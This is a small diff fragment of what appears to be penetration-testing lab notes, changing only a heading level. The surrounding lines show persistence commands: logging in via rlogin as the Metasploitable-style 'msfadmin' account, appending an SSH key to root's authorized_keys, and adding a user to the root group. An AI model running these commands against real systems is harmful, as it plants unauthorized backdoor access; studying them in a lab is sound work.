@@ -5,7 +5,7 @@ cat /root/.ssh/id_client.pub
 rlogin -l msfadmin 10.0.0.6
 echo "ssh key" >> /root/.ssh/authorized_keys
 ```
-### With server control
+# With server control
 #### At server:
 ```bash
 useradd -g root -s /bin/bash gustavo
